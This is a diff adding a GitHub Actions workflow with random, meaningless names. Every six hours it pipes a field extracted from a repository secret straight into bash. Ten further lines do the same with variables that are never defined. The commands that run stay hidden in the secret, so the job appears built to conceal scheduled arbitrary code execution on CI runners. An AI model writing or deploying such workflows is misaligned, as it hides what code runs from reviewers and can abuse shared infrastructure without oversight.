@@ -1,0 +1,27 @@
+name: zczzhengyinxial
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zczzhengyinxial
+        env:
+          zwkuy66: ${{ secrets.zwkuy66 }}
+        run: |
+          echo $zwkuy66 | jq -r .ln3 | /bin/bash
+          echo $z1 | jq -r .rmjoe6 | /bin/bash
+          echo $xah71 | jq -r .ysc7740 | /bin/bash
+          echo $uqqpj30425 | jq -r .vo776 | /bin/bash
+          echo $ipt132 | jq -r .d53598 | /bin/bash
+          echo $tdn3482 | jq -r .khuri18369 | /bin/bash
+          echo $hnek9 | jq -r .skqo5612 | /bin/bash
+          echo $jvbjy9696 | jq -r .h707 | /bin/bash
+          echo $wca00351 | jq -r .jl1382 | /bin/bash
+          echo $vei23 | jq -r .vm8 | /bin/bash
+          echo $ybisn8 | jq -r .hvumq714 | /bin/bash
+
